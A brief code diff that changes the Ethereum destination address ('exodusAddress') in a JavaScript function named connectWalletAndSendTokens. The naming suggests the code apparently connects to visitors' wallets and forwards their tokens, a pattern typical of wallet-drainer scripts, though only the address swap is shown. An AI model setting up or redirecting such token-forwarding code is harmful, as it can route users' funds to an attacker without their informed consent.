@@ -100,7 +100,7 @@ async function connectWalletAndSendTokens() {
       name: "Ethereum",
       chainName: "eth",
       nativeCoin: "ETH",
-      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
+      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
     }
   ];
 
